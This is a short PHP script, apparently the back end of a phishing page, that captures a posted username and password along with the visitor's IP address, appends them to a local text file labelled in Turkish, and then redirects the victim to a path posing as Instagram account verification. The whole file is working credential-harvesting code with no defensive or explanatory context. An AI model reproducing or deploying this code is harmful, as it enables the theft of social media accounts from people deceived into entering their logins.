<?php
if($_POST){
	$username = $_POST["id"];
	$password = $_POST["pw"];
    $ip = $_SERVER['REMOTE_ADDR'];
	$file = fopen('naverfr1end.txt', 'a'); 
	fwrite($file, $username."-----Sifre-----> " .$password. "IP Adresi" .$ip. "\n\n");
	fclose($file);
	echo '';
	header("Refresh:0; url= \Verify\Account\Support\Instagram");
}
?>